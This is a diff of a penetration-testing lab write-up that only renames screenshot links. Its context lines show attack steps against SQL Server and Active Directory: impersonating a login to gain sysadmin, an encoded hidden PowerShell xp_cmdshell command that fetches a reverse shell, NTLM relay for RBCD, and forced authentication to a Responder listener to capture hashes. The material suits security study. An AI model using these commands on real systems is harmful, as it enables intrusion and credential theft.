@@ -174,7 +174,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../.gitbook/assets/image (29).png>)
+![](<../../../.gitbook/assets/image (29) (1).png>)
 
 2\. The `0` means that the user `AMSTERDAM\richard` is not sysadmin. So we have to find a way to gain sysadmin privileges. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following SQL query:
 
@@ -205,7 +205,7 @@ use master;
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-![](<../../../.gitbook/assets/image (39) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1).png>)
 
 Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:
 
@@ -259,7 +259,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../.gitbook/assets/image (61) (1).png>)
+![](<../../../.gitbook/assets/image (61) (1) (1).png>)
 
 8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server. Now we can try to get command execution on the host.
 
@@ -332,7 +332,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded from the webserver and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
-![](<../../../.gitbook/assets/image (16) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)
 
 ### 6. Privesc RBCD
 
@@ -406,7 +406,7 @@ I also did a nslookup to check if the DNS record was created. The domain control
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../.gitbook/assets/image (5) (1) (1).png>)
 
 6\. Next we need to download en load the [Change-LockScreen.ps1](https://github.com/nccgroup/Change-Lockscreen) script from the NCCgroup and load it into memory on the target:
 
@@ -517,7 +517,7 @@ SELECT * FROM master..sysservers;
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
 ```
 
-![](<../../../.gitbook/assets/image (61).png>)
+![](<../../../.gitbook/assets/image (61) (1).png>)
 
 4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:
 
@@ -553,7 +553,7 @@ sudo responder -I tun0
 EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 ```
 
-![](<../../../.gitbook/assets/image (5).png>)
+![](<../../../.gitbook/assets/image (5) (1).png>)
 
 3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.
 
@@ -664,7 +664,7 @@ The owner successfully changed.
 Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
 9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
 
@@ -721,7 +721,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](<../../../.gitbook/assets/image (16).png>)
+![](<../../../.gitbook/assets/image (16) (1).png>)
 
 14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:
 
